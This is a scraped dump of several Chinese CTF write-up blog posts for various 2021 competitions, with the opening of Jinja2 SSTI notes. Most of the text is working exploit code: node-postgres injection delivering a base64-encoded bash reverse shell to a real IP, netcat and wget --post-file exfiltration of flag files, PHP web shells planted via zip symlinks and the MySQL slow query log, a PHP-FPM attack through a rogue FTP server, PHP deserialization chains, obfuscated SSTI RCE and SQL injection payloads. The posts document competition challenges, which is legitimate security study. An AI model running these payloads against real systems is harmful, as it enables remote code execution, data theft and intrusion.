\u0026#34;db\u0026#34;, port: 5432 }) client.connect() app.use(async ctx =\u0026gt; { ctx.response.type = \u0026#39;html\u0026#39; let id = ctx.request.query.id || 1 let sql = `SELECT * FROM \u0026#34;user\u0026#34; WHERE \u0026#34;id\u0026#34; = ${id}` const res = await client.query(sql) ctx.body = `\u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;table\u0026gt; \u0026lt;tr\u0026gt;\u0026lt;th\u0026gt;id\u0026lt;/th\u0026gt;\u0026lt;td\u0026gt;${res.rows[0].id}\u0026lt;/td\u0026gt;\u0026lt;/tr\u0026gt; \u0026lt;tr\u0026gt;\u0026lt;th\u0026gt;name\u0026lt;/th\u0026gt;\u0026lt;td\u0026gt;${res.rows[0].name}\u0026lt;/td\u0026gt;\u0026lt;/tr\u0026gt; \u0026lt;tr\u0026gt;\u0026lt;th\u0026gt;score\u0026lt;/th\u0026gt;\u0026lt;td\u0026gt;${res.rows[0].score}\u0026lt;/td\u0026gt;\u0026lt;/tr\u0026gt; \u0026lt;/table\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt;` }) app.listen(3000) 显然17行的let sql = 语句有sql的可能，不过注意这里的可控参数在where之后而不在select之后，我们没法轻易的控制字段名，即使是用联合查询\nselect * from \u0026#34;user\u0026#34; where id=-1 union slect 1,2,3 as \u0026#34;\\\\\u0026#39;+console.log(process.enc)]=null;//\u0026#34; 第二个select后的字段名也不会被postgres返回，只会回显第一个查询结果\n但是我们可以直接执行多语句\n/?id=1;select+1+as+\u0026#34;\\\u0026#39;+console.log(process.env)]=null;//\u0026#34; 会返回500，但是已经被正常执行语句了，打印出了环境变量\n原理呢，就是经典的转义不全\nvar inlineParser = function (fieldName, i) { return \u0026#34;\\nthis[\u0026#39;\u0026#34; + // fields containing single quotes will break // the evaluated javascript unless they are escaped // see https://github.com/brianc/node-postgres/issues/507 // Addendum: However, we need to make sure to replace all // occurences of apostrophes, not just the first one. // See https://github.com/brianc/node-postgres/issues/934 fieldName.replace(/\u0026#39;/g, \u0026#34;\\\\\u0026#39;\u0026#34;) + \u0026#34;\u0026#39;] = \u0026#34; + \u0026#39;rowData[\u0026#39; + i + \u0026#39;] == null ? null : parsers[\u0026#39; + i + \u0026#39;](rowData[\u0026#39; + i + \u0026#39;]);\u0026#39; } fileName就是字段名，只对单引号前加反斜杠fileName.replace(/'/g, \u0026quot;\\\\'\u0026quot;)，我们只要再加一个反斜杠就能逃逸了，所以我们就有了可控的字段名\n我们上面的payload传入之后会是这样\n\u0026#39;SELECT * FROM \u0026#34;user\u0026#34; WHERE \u0026#34;id\u0026#34; = 1;select 1 as \u0026#34;\\\\\u0026#39; console.log(process.env)]=null;//\u0026#34;\u0026#39; 诶，闭合了；如果在中间解析的地方下断点，可以看到传入Function类的函数体ctorBody值为\nthis[\u0026#39;\\\\\u0026#39;+console.log(process.env)]=null;//\u0026#39;] = rowData[0] == null ? null : parsers[0](rowData[0]); 确实，执行的就是我们的恶意语句\n构造反弹shell的poc，执行即可反弹shell（不成功的话记得把urlencode的special chars勾上）\n/?id=1;SELECT 1 AS \u0026#34;\\\u0026#39;]=0;require=process.mainModule.constructor._load;/*\u0026#34;, 2 AS \u0026#34;*/p=require(`child_process`);/*\u0026#34;, 3 AS \u0026#34;*/p.exec(`echo YmFzaCAtaSA+JiAvZGV2L3Rj`+/*\u0026#34;, 4 AS \u0026#34;*/`cC8xMDEuMzUuMTE0LjEwNy84NDI2IDA+JjE=|base64 -d|bash`)//\u0026#34; 其中核心payload分割后用b64编码+反引号来执行语句；Function环境下没有require()函数，不能获得child_process模块，使用process.mainModule.constructor._load来代替require\n修复方法是将fileName.replace(/'/g, \u0026quot;\\\\'\u0026quot;)修改为escape(fileName)，对大部分有问题字符进行转义\nmysql的max_allowed_packet 默认最大16M，超过则关闭连接不执行sql语句，不会把我们此次查询的记录保留下来，可以绕过waf\npostgresql特殊语句 特性：支持将16进制的值转换为unicode字符，并且可以自定义转义符\n利用这一点可以绕waf，空格用\\t绕过，自定义转义符设为感叹号\n\u0026#39;,\u0026#39;\u0026#39;)\\tON\\tCONFLICT\\t(username)\\tDO\\tUPDATE\\tSET\\tusername=\u0026#39;\u0026#39;\\tRETURNING\\t1\\tAS\\tU\u0026amp;\u0026#34;!005c!0027+(r=process.mainModule.require,l=!0022!0022)]!002f!002f\u0026#34;\\tUESCAPE\\t\u0026#39;!\u0026#39;,\\t1\\tAS\\tU\u0026amp;\u0026#34;!005c!0027+(l+=!0022!002freadflag|nc!0020123.123!0022)]!002f!002f\u0026#34;\\tUESCAPE\\t\u0026#39;!\u0026#39;,\\t1\\tAS\\tU\u0026amp;\u0026#34;!005c!0027+(l+=!0022.123.123!00201234!0022)]!002f!002f\u0026#34;\\tUESCAPE\\t\u0026#39;!\u0026#39;,\\t1\\tAS\\tU\u0026amp;\u0026#34;!005c!0027+(r(!0022child_process!0022).execSync(l))]!002f!002f\u0026#34;\\tUESCAPE\\t\u0026#39;!\u0026#39;; 这道题的sql注入点在update之后\nINSERT INTO users(username, password) VALUES(\u0026#39;${username}\u0026#39;, \u0026#39;${password}\u0026#39;) ON CONFLICT (username) DO NOTHING 一样的思路，先闭合，在构造正常的js语句\n\u0026#34;\u0026#34;\u0026#39;,\u0026#39;\u0026#39;)/*%s*/returning(1)as\u0026#34;\\\\\u0026#39;/*\u0026#34;,(1)as\u0026#34;\\\\\u0026#39;*/-(a=`child_process`)/*\u0026#34;,(2)as\u0026#34;\\\\\u0026#39;*/-(b=`/readflag|nc 10.188.2.20 9999`)/*\u0026#34;,(3)as\u0026#34;\\\\\u0026#39;*/-console.log(process.mainModule.require(a).exec(b))]=1//\u0026#34;--\u0026#34;\u0026#34; 还得结合一下前面那个16M的溢出\nstr(randint(1, 65535))+str(randint(1, 65535))+str(randint(1, 65535)) 最后是完整的exp，来自于orange佬\nfrom random import randint import requests # payload = \u0026#34;union\u0026#34; payload = \u0026#34;\u0026#34;\u0026#34;\u0026#39;,\u0026#39;\u0026#39;)/*%s*/returning(1)as\u0026#34;\\\\\u0026#39;/*\u0026#34;,(1)as\u0026#34;\\\\\u0026#39;*/-(a=`child_process`)/*\u0026#34;,(2)as\u0026#34;\\\\\u0026#39;*/-(b=`/readflag|nc 10.188.2.20 9999`)/*\u0026#34;,(3)as\u0026#34;\\\\\u0026#39;*/-console.log(process.mainModule.require(a).exec(b))]=1//\u0026#34;--\u0026#34;\u0026#34;\u0026#34; % (\u0026#39; \u0026#39;*1024*1024*16) username = str(randint(1, 65535))+str(randint(1, 65535))+str(randint(1, 65535)) data = { \u0026#39;username\u0026#39;: username+payload, \u0026#39;password\u0026#39;: \u0026#39;AAAAAA\u0026#39; } print \u0026#39;ok\u0026#39; r = requests.post(\u0026#39;http://10.188.2.20:12345/reg\u0026#39;, data=data); print r.content 深育这个题不过是把白盒审计换成了黑盒，思路一模一样，就不细嗦了\n参考wp：hitconDockerfile/hitcon-ctf-2017/sql-so-hard/（有这位师傅自制的docker可以自行复现）\nZipZip 页面源码提示：听说压缩包文件也能getshell；压缩包的一个常考点是软链接任意文件读取，不过脑子太木了没想到如何写shell进去，看了wp以后才明白\n上传zip之后回显的路径是/tmp/uploads，显然无法正常访问；这里可以利用软链接将shell写入/var/www/html\n首先创建一个指向/var/www/html/目录的软链接并zip压缩上传\nln -s /var/www/html/ l1 zip -ry l1.zip l1 然后建立一个和软链接名字相同的目录，在里面写shell，之后将这个同名的目录整个zip压缩上传\n# 当前目录/var/www/html/ mkdir l1 \u0026amp;\u0026amp; cd l1 echo \u0026#39;\u0026lt;?php eval($_GET[\u0026#39;wuhu\u0026#39;]);?\u0026gt;\u0026#39; \u0026gt; shell.php cd ../\t# 继续转到/var/www/html/ zip -r l2.zip ./* 即可写入shell\n***WebLog 一打开就会下载一个log文件，但是没什么内容，修改get参数为/?logname=logs/info/info.2021-11-12.log可以得到真正的log，可以看到是java，我爬了\neasysql long_query_time\n常用的select、单双引号、括号、分号、set、show、variables、等都没有过滤，语句闭合方式为括号，百名单为数据库记录行数，使用1);{sqlinject}--+可以闭合查询语句+堆叠注入\nshow variables like \u0026#39;%slow_query_log%\u0026#39;;\t# 查询慢日志记录是否开启 setglobal slow_query_log=1;\t# 开启慢查询日志 setglobal slow_query_log_file=\u0026#39;/var/www/html/helpyou2findflag.php\u0026#39;\t# 设置慢查询日志位置 慢查询，顾名思义时间长的查询记录会被记录下来，我们直接把long_query_time的默认值改掉，然后写入shell\n1);setglobal long_query_time=0.000001;--+ 1);show variables like \u0026#39;long_query_time\u0026#39;l--+ 1);select \u0026#39;\u0026lt;?php $_REQUEST[a]($_REQUEST[b])?\u0026gt;\u0026#39;;--+ 或者用benchmark这样的函数延长执行时间\n1);set GLOBAL slow_query_log_file=\u0026#39;/var/www/html/helpyou2findflag.php\u0026#39;;set GLOBAL slow_query_log=on;set GLOBAL log_queries_not_using_indexes=on;select 0x3c3f706870206576616c28245f504f53545b315d293b3f3e from mysql.db where BENCHMARK(5000000000,MD5(0x5476556d));%23 flag位于/home/rainbow/ssh.log\n比赛能暴露出我太多短板了，问题挺大的\n首先是容易手忙脚乱，第二是他妈的跟个脑瘫一样找到原题都不会变通，第三是就会瞎bb不会学java，第四是缺乏跟队友的沟通\n就差一题就进线下了，这一题就折在我这里，真是我全责，真的很对不起另外的pwn爷和密码爷，太丢人了，我先磕一个，然后给自己两拳\n太他妈可惜了，草\n","date":"2021-11-17T19:11:38+08:00","permalink":"https://amiaaaz.github.io/2021/11/17/jueyucup-2021-wp/","section":"posts","tags":["wp"],"title":"深育杯2021 Wp"},{"categories":["CTF"],"contents":"CheckIN 是个go的文件，发现了/wget路由可以执行wget命令，接收的参数可以是个数组\n利用wget的参数外带flag\n/wget?argv=1\u0026amp;agrv=--post-file\u0026amp;argv=/flag\u0026amp;agrv=http://101.35.114.107:8426/ eaaasyphp \u0026lt;?php class Check { public static $str1 = false; public static $str2 = false; } class Esle { public function __wakeup() { Check::$str1 = true; } } class Hint { public function __wakeup(){ $this-\u0026gt;hint = \u0026#34;no hint\u0026#34;; } public function __destruct(){ if(!$this-\u0026gt;hint){ $this-\u0026gt;hint = \u0026#34;phpinfo\u0026#34;; ($this-\u0026gt;hint)(); } } } class Bunny { public function __toString() { if (Check::$str2) { if(!$this-\u0026gt;data){ $this-\u0026gt;data = $_REQUEST[\u0026#39;data\u0026#39;]; } file_put_contents($this-\u0026gt;filename, $this-\u0026gt;data); } else { throw new Error(\u0026#34;Error\u0026#34;); } } } class Welcome { public function __invoke() { Check::$str2 = true; return \u0026#34;Welcome\u0026#34; . $this-\u0026gt;username; } } class Bypass { public function __destruct() { if (Check::$str1) { ($this-\u0026gt;str4)(); } else { throw new Error(\u0026#34;Error\u0026#34;); } } } if (isset($_GET[\u0026#39;code\u0026#39;])) { unserialize($_GET[\u0026#39;code\u0026#39;]); } else { highlight_file(__FILE__); } 这个题，怎么说 还是我太年轻了 我以为这个就是简单的反序列化+shell写入，然后非常的疑惑为啥本地可以但是远程的shell死活就是不落地，一直在想怎么绕过，这是当时尝试的exp.php\n\u0026lt;?php class Check { public static $str1 = false; public static $str2 = false; } class Esle { public $str3; } class Bunny { public $filename; public $data; } class Welcome { public $username; } class Bypass { public $str4; } $check = new Check(); $esle = new Esle(); $bypass = new Bypass(); $welcome = new Welcome(); $bunny = new Bunny(); $esle -\u0026gt; str3 = $bypass; // $bypass -\u0026gt; str4 = \u0026#39;phpinfo\u0026#39;; $bypass -\u0026gt; str4 = $welcome; $welcome -\u0026gt; username = $bunny; $bunny -\u0026gt; filename = \u0026#34;op.php\u0026#34;; $bunny -\u0026gt; data = \u0026#34;xyz\u0026#34; $payload = serialize($esle); echo $payload; 直到赛后才知道这又又又是fpm，需要用ftp打fpm，具体的内容我最近也正在总结，可以参见-\u0026gt;攻击 PHP-FPM 学习笔记（还没全部收尾）\n首先是依据p牛的脚本生成一个urlencode的payload（这里引号有问题的话直接改脚本吧）\n$ python fpm.py 127.0.0.1 \u0026#39;/var/www/html/index.php\u0026#39; -c \u0026#39;\u0026lt;?php exec(\u0026#34;bash -c \\\u0026#39;/bin/bash -i \u0026gt;\u0026amp; /dev/tcp/101.35.114.107/8426 0\u0026gt;\u0026amp;1\\\u0026#39;\u0026#34;);?\u0026gt;\u0026#39; 然后开一个恶意的ftp-server\nimport socket s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.bind((\u0026#39;0.0.0.0\u0026#39;, 8001)) s.listen(1) conn, addr = s.accept() conn.send(b\u0026#39;220 welcome\\n\u0026#39;) #Service ready for new user. #Client send anonymous username #USER anonymous conn.send(b\u0026#39;331 Please specify the password.\\n\u0026#39;) #User name okay, need password. #Client send anonymous password. #PASS anonymous conn.send(b\u0026#39;230 Login successful.\\n\u0026#39;) #User logged in, proceed. Logged out if appropriate. #TYPE I conn.send(b\u0026#39;200 Switching to Binary mode.\\n\u0026#39;) #Size / conn.send(b\u0026#39;550 Could not get the file size.\\n\u0026#39;) #EPSV (1) conn.send(b\u0026#39;150 ok\\n\u0026#39;) #PASV conn.send(b\u0026#39;227 Entering Extended Passive Mode (127,0,0,1,0,9000)\\n\u0026#39;) #STOR / (2) conn.send(b\u0026#39;150 Permission denied.\\n\u0026#39;) #QUIT conn.send(b\u0026#39;221 Goodbye.\\n\u0026#39;) conn.close() print(\u0026#34;endd\u0026#34;) 修改之前的反序列化exp\n\u0026lt;?php class Bunny{ public function __construct(){ $this-\u0026gt;data = urldecode(\u0026#39;xxxxxxxxxxxxxxxxxx\u0026#39;); $this-\u0026gt;filename = \u0026#34;ftp://101.35.114.107:8001/aaa\u0026#34;; } } class Welcome{ public function __construct(){ $this-\u0026gt;username = new Bunny(); } } class Bypass{ public function __construct(){ $this-\u0026gt;str4 = new Welcome(); } } class Esle{ } echo urlencode(serialize(array(new Esle(), new Bypass()))); get方式传入，同时vps上开一个ftp-server和一个监听反弹shell的端口，即可拿flag\nMagicMail 原题，ssti套壳，参见-\u0026gt;[DeconstruCTF 2021]Mega Mailer，但是比赛的时候我没出，是我的问题，平时拿现成的payload梭惯了，自己构造的时候就露了怯\npayload的构造参见-\u0026gt;Jinja2 SSTI filter bypasses，使用attr()+hex字符串的方式把基础payload给拼出来\nsender=\u0026amp;receiver=\u0026amp;subject=\u0026amp;message={{()|attr(\u0026#34;\\x5f\\x5f\\x63\\x6c\\x61\\x73\\x73\\x5f\\x5f\u0026#34;)|attr(\u0026#34;\\x5f\\x5f\\x62\\x61\\x73\\x65\\x5f\\x5f\u0026#34;)|attr(\u0026#34;\\x5f\\x5f\\x73\\x75\\x62\\x63\\x6c\\x61\\x73\\x73\\x65\\x73\\x5f\\x5f\u0026#34;)()|attr(\u0026#34;\\x5f\\x5f\\x67\\x65\\x74\\x69\\x74\\x65\\x6d\\x5f\\x5f\u0026#34;)(180)|attr(\u0026#34;\\x5f\\x5f\\x69\\x6e\\x69\\x74\\x5f\\x5f\u0026#34;)|attr(\u0026#34;\\x5f\\x5f\\x67\\x6c\\x6f\\x62\\x61\\x6c\\x73\\x5f\\x5f\u0026#34;)|attr(\u0026#34;\\x5f\\x5f\\x67\\x65\\x74\\x69\\x74\\x65\\x6d\\x5f\\x5f\u0026#34;)(\u0026#34;\\x5f\\x5f\\x62\\x75\\x69\\x6c\\x74\\x69\\x6e\\x73\\x5f\\x5f\u0026#34;)|attr(\u0026#34;\\x5f\\x5f\\x67\\x65\\x74\\x69\\x74\\x65\\x6d\\x5f\\x5f\u0026#34;)(\u0026#34;\\x65\\x76\\x61\\x6c\u0026#34;)(\u0026#34;\\x5f\\x5f\\x69\\x6d\\x70\\x6f\\x72\\x74\\x5f\\x5f\\x28\\x27\\x6f\\x73\\x27\\x29\\x2e\\x70\\x6f\\x70\\x65\\x6e\\x28\\x27\\x63\\x61\\x74\\x20\\x2f\\x66\\x6c\\x61\\x67\\x27\\x29\\x2e\\x72\\x65\\x61\\x64\\x28\\x29\u0026#34;)}} # 原本的样子 ().__class__.__base__.subclasses()[180].__init__.__globals__[\u0026#39;__builtins__\u0026#39;][\u0026#39;eval\u0026#39;](\u0026#34;__import__(\u0026#39;os\u0026#39;).popen(\u0026#39;cat /flag\u0026#39;).read()\u0026#34;) ","date":"2021-11-16T14:24:03+08:00","permalink":"https://amiaaaz.github.io/2021/11/16/longyuanzhanyi-ctf-wp/","section":"posts","tags":["wp"],"title":"陇原战疫CTF Wp"},{"categories":["CTF"],"contents":"给我看看 \u0026lt;?php header(\u0026#34;Content-Type: text/html;charset=utf-8\u0026#34;); error_reporting(0); require_once(\u0026#34;flag.php\u0026#34;); class whoami{ public $name; public $your_answer; public $useless; public function __construct(){ $this-\u0026gt;name=\u0026#39;ctfshow第一深情\u0026#39;; $this-\u0026gt;your_answer=\u0026#39;Only you know\u0026#39;; $this-\u0026gt;useless=\u0026#34;I_love_u\u0026#34;; } public function __wakeup(){ global $flag; global $you_never_know; $this-\u0026gt;name=$you_never_know; if($this-\u0026gt;your_answer === $this-\u0026gt;name){ echo $flag; } } } $secret = $_GET[\u0026#39;s\u0026#39;]; if(isset($secret)){ if($secret===\u0026#34;给我看看!\u0026#34;){ extract($_POST); if($secret===\u0026#34;给我看看!\u0026#34;){ die(\u0026#34;\u0026lt;script\u0026gt;window.alert(\u0026#39;这是不能说的秘密\u0026#39;);location.href=\u0026#39;https://www.bilibili.com/video/BV1CW411g7UF\u0026#39;;\u0026lt;/script\u0026gt;\u0026#34;); } unserialize($secret); } }else{ show_source(__FILE__); } 是几个小trick的合集，不难\nextract()可以变量覆盖 $this-\u0026gt;your_answer === $this-\u0026gt;name这样的强比较可以用指针取地址方式绕过 exp\n$test = new whoami(); $test-\u0026gt;your_answer=\u0026amp;$test-\u0026gt;name; echo serialize($test); payload\n/?s=%E7%BB%99%E6%88%91%E7%9C%8B%E7%9C%8B%21 POST: secret=O%3A6%3A%22whoami%22%3A3%3A%7Bs%3A4%3A%22name%22%3Bs%3A19%3A%22ctfshow%E7%AC%AC%E4%B8%80%E6%B7%B1%E6%83%85%22%3Bs%3A11%3A%22your%5Fanswer%22%3BR%3A2%3Bs%3A7%3A%22useless%22%3Bs%3A8%3A%22I%5Flove%5Fu%22%3B%7D 谁是ctf之王？ 据说输入框能连起来的\nf12可以看到提示/ssti.html\n然后没啥可说的，原题，一点都没改，直接看之前的博客-\u0026gt;[DigitalOverdoseCTF 2021]madlib\nyysy，看到这个hint我就已经意识到是在考这个题了，果然，没拿上一血可惜了\neasypop \u0026lt;?php highlight_file (__FILE__); error_reporting(0); class action_1{ public $tmp; public $fun = \u0026#39;system\u0026#39;; public function __call($wo,$jia){ call_user_func($this-\u0026gt;fun); } public function __wakeup(){ $this-\u0026gt;fun = \u0026#39;\u0026#39;; die(\u0026#34;阿祖收手吧，外面有套神\u0026#34;); } public function __toString(){ return $this-\u0026gt;tmp-\u0026gt;str; } } class action_2{ public $p; public $tmp; public function getFlag(){ if (isset($_GET[\u0026#39;ctfshow\u0026#39;])) { $this-\u0026gt;tmp = $_GET[\u0026#39;ctfshow\u0026#39;]; } system(\u0026#34;cat /\u0026#34;.$this-\u0026gt;tmp); } public function __call($wo,$jia){ phpinfo(); } public function __wakeup(){ echo \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; echo \u0026#34;php版本7.3哦，没有人可以再绕过我了\u0026#34;; echo \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; } public function __get($key){ $function = $this-\u0026gt;p; return $function(); } } class action_3{ public $str; public $tmp; public $ran; public function __construct($rce){ echo \u0026#34;送给你了\u0026#34;; system($rce); } public function __destruct(){ urlencode($this-\u0026gt;str); } public function __get($jia){ if(preg_match(\u0026#34;/action_2/\u0026#34;,get_class($this-\u0026gt;ran))){ return \u0026#34;啥也没有\u0026#34;; } return $this-\u0026gt;ran-\u0026gt;$jia(); } } class action_4{ public $ctf; public $show; public $jia; public function __destruct(){ $jia = $this-\u0026gt;jia; echo $this-\u0026gt;ran-\u0026gt;$jia; } public function append($ctf,$show){ echo \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; echo new $ctf($show); } public function __invoke(){ $this-\u0026gt;append($this-\u0026gt;ctf,$this-\u0026gt;show); } } if(isset($_GET[\u0026#39;pop\u0026#39;])){ $pop = $_GET[\u0026#39;pop\u0026#39;]; $output = unserialize($pop); if(preg_match(\u0026#34;/php/\u0026#34;,$output)){ echo \u0026#34;套神黑进这里并给你了一个提示：文件名是f开头的形如fA6_形式的文件\u0026#34;; die(\u0026#34;不可以用伪协议哦\u0026#34;); } } 先直接放payload把，直接用的action_3的rce\n\u0026lt;?php class action_4{ public function __construct(){ $this-\u0026gt;ctf = \u0026#39;action_3\u0026#39;; $this-\u0026gt;show = \u0026#39;cat /fz3_.txt\u0026#39;; } } class action_2{ public function __construct(){ $this-\u0026gt;p = new action_4(); } } class action_1{ public function __construct(){ $this-\u0026gt;tmp = new action_2(); } } class action_3{ public function __construct(){ $this-\u0026gt;str = new action_1(); } } echo serialize(new action_3()); 这个应该比较简单，不用分析都能看明白\n官方wp的预期解长这样-\u0026gt;wp，首先用到了php的内置类DirectoryIterator配合glob伪协议爆破flag文件名\n\u0026lt;?php class action_4 { public function __construct(){ $this-\u0026gt;ctf = \u0026#34;DirectoryIterator\u0026#34;; //GlobIterator $this-\u0026gt;show =\u0026#34;glob:///f[A-z][0-9]_*\u0026#34;; } } class action_3{ public function __construct(){ $this-\u0026gt;str = new action_1(); } } class action_1{ public function __construct(){ $this-\u0026gt;tmp = new action_2(); } } class action_2{ public function __construct(){ $this-\u0026gt;p = new action_4(); } } echo serialize(new action_3()); 这个确实，但是之后的call_user_func，我只能说 有一说一 我是没复现成功\n这里的死亡wakeup永远会比call先调用，func这里还没到call_user_func就先被清空了，怎么执行？？？\n近在眼前 #!/usr/bin/env python3 from flask import Flask, render_template_string, request from flask_limiter import Limiter from flask_limiter.util import get_remote_address app = Flask(__name__) limiter = Limiter( app, key_func=get_remote_address, default_limits=[\u0026#34;10000 per hour\u0026#34;] ) @limiter.limit(\u0026#34;5/second\u0026#34;, override_defaults=True) @app.route(\u0026#39;/\u0026#39;) def index(): return (\u0026#34;\\x3cpre\\x3e\\x3ccode\\x3e%s\\x3c/code\\x3e\\x3c/pre\\x3e\u0026#34;)%open(__file__).read() @limiter.limit(\u0026#34;5/second\u0026#34;, override_defaults=True) @app.route(\u0026#39;/ssti\u0026#39;) def check(): flag = open(\u0026#34;/app/flag.txt\u0026#34;, \u0026#39;r\u0026#39;).read().strip() if \u0026#34;input\u0026#34; in request.args: query = request.args[\u0026#34;input\u0026#34;] render_template_string(query) return \u0026#34;Thank you for your input.\u0026#34; return \u0026#34;No input found.\u0026#34; app.run(\u0026#39;0.0.0.0\u0026#39;, 80) 属于是char-by-char类型盲注和ssti的结合，限制了1秒5次请求，所以需要我们特意限制一下\nimport requests _url = \u0026#39;http://9a5415f7-b712-423d-b7d4-7f2d61665f95.challenge.ctf.show/ssti?input=\u0026#39; _payload_1 = \u0026#34;{%25 set flag=config.__class__.__init__.__globals__[\u0026#39;os\u0026#39;].popen(\u0026#39;cat /app/flag.txt\u0026#39;).read()%25}{%25 set sleep=config.__class__.__init__.__globals__[\u0026#39;os\u0026#39;].popen(\u0026#39;sleep 2.5\u0026#39;)%25}{%25if \u0026#39;\u0026#34; _payload_2 = \u0026#34;\u0026#39; in flag%25}{{sleep.read()}}{%25endif%25}\u0026#34; r = requests.session() charset = \u0026#39;abcdefghijklmnopqrstuvwxyz0123456789-_{}\u0026#39; data = \u0026#39;\u0026#39; content = \u0026#39;ctfshow{\u0026#39; for _ in range(40): for i in charset: data = content + i # print(data) url = _url + _payload_1 + data + _payload_2 try: r.get(url=url, timeout=(2.5, 2.5)) except Exception as e: content = data print(content) break print(data) 有小概率会崩，可以多跑一次\n通关大佬 登录，尝试admin: admin，回显 你不能以管理员账号登录，抓包看到jwt，先用jwt.io梭一下\n再用c-jwt-cracker梭一下，爆出来key=12345（不过说实话我这里真没爆出来），再用jwt.io改一下user和exp\neyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJuYW1lIjoiYWRtaW4iLCJleHAiOjE2MzY5NTUwNjR9.jEw2QuCd67ZRC_eAVynhcZTYAyjHSxfrrpkqEF98Uio 看到这种的框，直觉就是sqli, xss, ssti；加上jwt一般flask会用，试一下ssti，果然\n这里的通关人对长度进行了限制，排名需要是数字，时间没有啥必要改，感言不限长度，但是过滤了一票字符（单双引号（无法用hex和拼接），下划线，request，中括号，百分号（无法for语句遍历 如果用chr()还得爆破），算是比较严格的了），可以用|attr()这样的形式来绕过，看了wp之后发现这里还结合了request.args，也就是加一些get参数然后在post的部分进行引用，再充分利用config这个对象（前面那个原题也是充分用了config），payload:\n/edit?a=__init__\u0026amp;b=__globals__\u0026amp;c=__getitem__\u0026amp;d=os\u0026amp;e=popen\u0026amp;f=whoami\u0026amp;g=read POST: name={%25set%20r=request.args%25}\u0026amp;rank=1\u0026amp;speech={{(config|attr(r.a)|attr(r.b))|attr(r.c)(r.d)|attr(r.e)(r.f)|attr(r.g)()}}\u0026amp;time=2021年11月11日 ","date":"2021-11-16T03:00:57+08:00","permalink":"https://amiaaaz.github.io/2021/11/16/ctfshow-1121-jjcup-wp/","section":"posts","tags":["wp"],"title":"CTFshow1121击剑杯 Wp"},{"categories":["CTF"],"contents":"安全攻防\u0026ndash;1 https://security.bilibili.com/sec1024/q/r1.html | 提示\n1024程序员节，大家一起和2233参与解密游戏吧~ happy_1024_2233: e9ca6f21583a1533d3ff4fd47ddc463c6a1c7d2cf084d364 0408abca7deabb96a58f50471171b60e02b1a8dbd32db156\na1cd5f84-27966146-3776f301-64031bb9\n安全攻防\u0026ndash;2 https://security.bilibili.com/sec1024/q/ | 提示\n某高级前端开发攻城狮更改了一个前端配置项\n提示中给的是vue的官方文档，并且定位到了productionSourceMap\n来一波f12\n36c7a7b4-cda04af0-8db0368d-b5166480\n安全攻防\u0026ndash;3 https://security.bilibili.com/sec1024/q/eval.zip | 提示\nPHP is the best language for web programming, but what about other languages?\n\u0026lt;?php /* bilibili- ( ゜- ゜)つロ 乾杯~ uat: http://192.168.3.2/uat/eval.php pro: http://security.bilibili.com/sec1024/q/pro/eval.php */ $args = @$_GET[\u0026#39;args\u0026#39;]; if (count($args) \u0026gt;3) { exit(); } for ( $i=0; $i\u0026lt;count($args); $i++ ){ if ( !preg_match(\u0026#39;/^\\w+$/\u0026#39;, $args[$i]) ) { exit(); } } // todo: other filter $cmd = \u0026#34;/bin/2233 \u0026#34; . implode(\u0026#34; \u0026#34;, $args); exec($cmd, $out); for ($i=0; $i\u0026lt;count($out); $i++){ echo($out[$i]); echo(\u0026#39;\u0026lt;br\u0026gt;\u0026#39;); } ?\u0026gt; 可以get方式接收最多3个名为args的参数，对每个参数的值进行正则匹配，最后拼接到$cmd后面被exec执行，用%0a换行+数组[]绕过\npayload\nhttps://security.bilibili.com/sec1024/q/pro/eval.php?args[]=1%0a\u0026amp;args[]=ls https://security.bilibili.com/sec1024/q/pro/eval.php?args[]=1%0a\u0026amp;args[]=cat\u0026amp;args[]=passwd 9d3c3014-6c6267e7-086aaee5-1f18452a\n安全攻防\u0026ndash;4 https://security.bilibili.com/sec1024/q/ | 提示\n懂的都懂\n有个请求api https://security.bilibili.com/sec1024/q/admin/api/v1/log/list，本能的去fuzz一下，结果412了……QAQ\nusername部分可以sqli，过滤了空格和单引号，用注释和16进制绕过\npayload\n\u0026#34;user_name\u0026#34;: \u0026#34;1/**/union/**/select/**/database(),user(),3,4,5\u0026#34;, \u0026#34;user_name\u0026#34;: \u0026#34;1/**/union/**/select/**/database(),user(),3,4,group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()#\u0026#34;, \u0026#34;user_name\u0026#34;: \u0026#34;1/**/union/**/select/**/database(),user(),3,4,group_concat(id)/**/from/**/flag#\u0026#34;, 3d5dd579-0678ef93-18b70cae-cabc5d51\n难度应该算是偏简单的，就是，emmmmmmmmmm\n算了，我不好说\n","date":"2021-11-14T20:15:47+08:00","permalink":"https://amiaaaz.github.io/2021/11/14/bilibili-sec1024-wp/","section":"posts","tags":["wp"],"title":"Bilibili 1024安全攻防 Wp"},{"categories":["NOTES\u0026SUMMARY"],"contents":"模板渲染可以借助代码构造（如条件、循环语句等）十分方便的动态呈现内容，但如果编写不当容易被攻击者注入恶意内容从而暴露上下文数据，甚至在服务器上运行执行任意命令的表达式\nJinja Jinja2是一种面向Python的现代和设计友好的模板语言，以Django的模板为模型，是Flask框架的一部分\nJinja2 能识别所有类型的变量，甚至是一些复杂的类型，例如列表、字典和对象。此外，还可使用过滤器修改变量，过滤器名添加在变量名之后，中间使用竖线分隔（这很有利于我们构造恶意的payload），比如这样的模板可以用首字母大写形式显示变量name的值\nHello, {{name|capitalize}} Jinjia2也支持控制语句，比如这是一个常见的for语句的渲染情况\n\u0026lt;ul\u0026gt; {% for comment in comments %} \u0026lt;li\u0026gt;{{comment}}\u0026lt;/li\u0026gt; {% endfor %} \u0026lt;/ul\u0026gt; 之所以有模板渲染的漏洞是因为在渲染传递进去的参数时模板可以直接访问Python的一些对象及方法，可以构造一个长长的继承链来执行一些操作，比如文件读写\u0026amp;命令执行\n__dict__：保存类实例或对象实例的属性变量键值对字典 __class__：返回一个实例所属的类；python中的新式类（显示继承object对象的类）都有一个属性__class用于获取当前实例对应的类 __mro__：返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析（即MRO - Method Resolution Order） __bases__：以元组形式返回一个类直接所继承的类（可以理解为直接父类） __base__：返回一个类直接所继承的类（单个）（相当于__bases__[0]），和__mro__都是用来寻找基类的 